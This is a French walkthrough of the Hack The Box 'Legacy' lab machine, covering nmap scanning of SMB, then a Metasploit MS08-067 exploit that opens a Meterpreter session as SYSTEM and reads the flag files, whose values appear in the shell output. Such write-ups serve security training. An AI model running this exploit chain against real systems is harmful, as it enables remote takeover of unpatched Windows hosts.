# Legacy

> **Statut** : [x] Root
> **OS** : Windows XP SP3
> **Difficulté** : Easy
> **HTB** : https://app.hackthebox.com/machines/Legacy
> **Difficulté ressentie** : 2/10
> **IP** : 10.129.9.217

---

## Reconnaissance

### Nmap - scan initial

```bash
nmap -sV -sC -A -p 135,139,445 10.129.9.217
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

```
Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   NetBIOS computer name: LEGACY
|   Workgroup: HTB
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|   message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Analyse

- **OS** : Windows XP SP3 - systeme extremement ancien, fin de support depuis 2014
- **Surface d'attaque** : SMB (445) est le service principal expose
- **Indices cles** :
  - Windows XP + SMBv1 uniquement (la negociation SMB2 echoue) = candidat pour **MS08-067** (netapi) et **MS17-010** (EternalBlue)
  - Signature SMB desactivee
  - Acces guest autorise

### Enumeration SMB

Tentative de lister les shares avec `smbclient` - echec car macOS negocie en SMB2/3 par defaut et Windows XP ne supporte que SMBv1 :

```bash
smbclient -L //10.129.9.217/ -N
# Protocol negotiation (with timeout 20000 ms) timed out against server
```

> **Note** : pour forcer SMBv1 depuis macOS, il faudrait utiliser `--option='client min protocol=NT1' --option='client max protocol=NT1'`. Mais sur cette box, l'enumeration des shares n'est pas le vecteur d'attaque principal.

---

## Exploitation

### Vecteur d'attaque

**MS08-067 - NetAPI** : vulnerabilite critique dans le service Server de Windows (netapi32.dll) permettant l'execution de code a distance via une requete RPC malformee sur le port 445. Affecte Windows 2000, XP, Server 2003, Vista, Server 2008.

CVE : CVE-2008-4250

### Exploitation avec Metasploit

```bash
msfconsole
search ms08-067
use exploit/windows/smb/ms08_067_netapi
```

Configuration :

```bash
set RHOSTS 10.129.9.217
set RPORT 445
set LHOST 10.10.14.182
set LPORT 4444
```

Lancement :

```bash
run
```

```
[*] 10.129.9.217:445 - Automatically detecting the target...
[*] 10.129.9.217:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.9.217:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.9.217:445 - Attempting to trigger the vulnerability...
[*] Sending stage (190534 bytes) to 10.129.9.217
[*] Meterpreter session 1 opened
```

L'exploit detecte automatiquement la cible (XP SP3 English) et retourne un **Meterpreter** avec les privileges **NT AUTHORITY\SYSTEM**.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Privilege Escalation

Aucune escalade de privileges necessaire - l'exploit MS08-067 s'execute au niveau kernel et donne directement les privileges **SYSTEM**.

---

## Flags

Depuis Meterpreter, utiliser `shell` pour obtenir un shell Windows classique :

```
meterpreter > shell
```

La structure des dossiers sur Windows XP est `C:\Documents and Settings\` (pas `C:\Users\` comme sur les Windows modernes).

```
C:\> type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f

C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```

- **User** : `[REDACTED]`
- **Root** : `[REDACTED]`

---

## Lecons apprises

- **Arborescence Windows XP** : les profils utilisateurs sont dans `C:\Documents and Settings\` et non `C:\Users\` (introduit a partir de Vista). Les flags se trouvent donc dans `C:\Documents and Settings\<user>\Desktop\`. Ne pas chercher `C:\Users`, ce chemin n'existe pas sur XP.
- **SMBv1 uniquement** : Windows XP ne supporte que SMBv1. La negociation SMB2 echoue systematiquement (`Protocol negotiation failed (SMB2)`). Depuis macOS ou un systeme moderne, `smbclient` tente SMB2/3 par defaut et timeout. Forcer le protocole avec `--option='client min protocol=NT1'`.
- **Windows XP + SMB = MS08-067** : des qu'on voit Windows XP avec le port 445 ouvert, penser immediatement a MS08-067 (netapi). C'est le chemin le plus fiable et stable. MS17-010 (EternalBlue) fonctionne aussi sur XP mais est moins stable.
- **MS08-067 donne SYSTEM directement** : comme EternalBlue, cet exploit s'execute au niveau kernel et ne necessite pas d'escalade de privileges separee.
